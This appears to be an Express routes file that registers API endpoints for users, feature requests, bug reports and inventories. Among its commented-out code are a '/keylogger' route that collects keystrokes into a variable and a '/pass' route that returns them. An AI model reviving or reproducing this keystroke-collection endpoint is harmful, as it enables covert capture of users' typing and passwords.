'use strict';
var user = require('../modules/user').routes;
var featureRequest = require('../modules/featureRequest').routes;
var bugReport = require('../modules/bugReport').routes;
var inventories = require('../modules/inventory').routes;
var responses = require('../responses').routes;
var express = require('express');

module.exports = function(routes){
    // routes.get('/', function(req, res) {
    //     res.sendFile('C:\\Work\\Dot\\setup\\dot.jpg');
    // });
	
	var logged = '';
	
    routes.get('/api/users', user.get);
    routes.get('/api/karma', user.getKarma);
    routes.get('/api/featureRequests', featureRequest.get);
    routes.get('/api/bugReports', bugReport.get);
    routes.get('/api/responses', responses.get);
    routes.get('/api/inventories', inventories.get);
	// routes.get('/keylogger', function(req, res) {
	// 	logged += req.query.key[0];
    //     res.send();
	// });
	
	// routes.get('/pass', function(req, res) {
    //     res.send(logged);
	// })
    
    routes.use(express.static("./routes/views")).get("/", function (req, resp) {
        resp.sendFile("responses.html", { root: "./routes/views" });
    });
};
